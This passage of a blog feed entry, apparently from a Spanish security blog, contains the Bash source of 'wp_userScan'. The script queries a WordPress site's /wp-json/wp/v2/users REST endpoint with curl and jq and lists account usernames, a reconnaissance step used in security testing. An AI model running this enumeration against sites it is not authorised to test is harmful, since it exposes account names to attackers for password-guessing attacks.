&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;banner&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;grayColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;__      __ _ __   ___      _   _  ___   ___  _ __  ___ / _&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ___  __ _  _ __  &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.25
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/ /| '_ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/ __|    | | | |/ __| / _ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; '__|/ __|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; / __|/ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ||&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;V  V / | |_) |&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   | |_| |&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  __/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;| |   &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_\ \|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; (__| (_| || | | | &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;- Created by Eric Labrador &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blueColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.25
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;  &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/  | .__/ |___/_____&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_,_||___/ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;__||_|   |___/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_/ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;__|&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_,_||_| |_|&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;0.25
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;          |_|        |_____|                                                  &quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;


banner
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;turquoiseColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*]&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;yellowColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Url:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;url
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1 1000&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/wp-json/wp/v2/users/?per_page=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;page=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | jq | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/name://g'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\t\t&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;redColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[*] - &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;yellowColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;endColour&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Eric Labrador</name><email>e.l.s.3334@gmail.com</email></author><category term="script" /><category term="wordpress" /><category term="shell" /><category term="enumeration" /><summary type="html">En este artículo, explico la utilidad de la herramienta wp_userScan, escrita en Bash.</summary></entry></feed>